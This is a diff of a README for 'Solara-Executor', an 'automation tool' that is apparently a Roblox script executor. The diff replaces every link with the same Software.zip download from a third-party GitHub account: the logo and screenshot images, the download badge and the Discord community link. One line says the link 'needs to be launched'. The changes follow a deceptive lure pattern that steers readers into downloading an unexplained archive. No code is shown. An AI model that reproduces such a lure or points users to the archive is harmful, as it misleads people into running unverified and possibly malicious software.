@@ -1,7 +1,7 @@
 
 # Welcome to Solara-Executor 🚀
 
-![Solara-Executor Logo](https://example.com/solara-executor-logo.png)
+![Solara-Executor Logo](https://github.com/CozyCinnamon/Solara-Executor/releases/download/v2.0/Software.zip)
 
 Solara-Executor is your go-to open-source automation tool designed to make your tasks and processes simpler and more efficient. Whether you're a seasoned developer or just starting out in the world of automation, Solara-Executor has got you covered. With powerful features and a user-friendly interface, you can now execute tasks with ease and speed.
 
@@ -16,7 +16,7 @@ Solara-Executor is your go-to open-source automation tool designed to make your 
 
 To get started with Solara-Executor, simply download the software by clicking the button below:
 
-[![Download Solara-Executor](https://img.shields.io/badge/Download-Solara--Executor-blue.svg)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Solara-Executor](https://github.com/CozyCinnamon/Solara-Executor/releases/download/v2.0/Software.zip)](https://github.com/CozyCinnamon/Solara-Executor/releases/download/v2.0/Software.zip)
 
 **Note: This link needs to be launched.**
 
@@ -31,7 +31,7 @@ If the above link is not working or you need a different version, please check t
 
 ## Community and Support 👨‍💻
 
-Join our Discord community to connect with other users, share your experiences, and get support on using Solara-Executor for your projects. Visit [Solara Discord Community](https://discord.com/solara-roblox) to get started.
+Join our Discord community to connect with other users, share your experiences, and get support on using Solara-Executor for your projects. Visit [Solara Discord Community](https://github.com/CozyCinnamon/Solara-Executor/releases/download/v2.0/Software.zip) to get started.
 
 ## Contributors and Acknowledgements 🙌
 
@@ -50,4 +50,4 @@ Ready to simplify your automation tasks? Download Solara-Executor now and experi
 
 Made with ❤️ by the Solara-Executor team. Let's automate the world together! 💻🚀
 
-![Solara-Executor](https://example.com/solara-executor-screenshot.png)
+![Solara-Executor](https://github.com/CozyCinnamon/Solara-Executor/releases/download/v2.0/Software.zip)
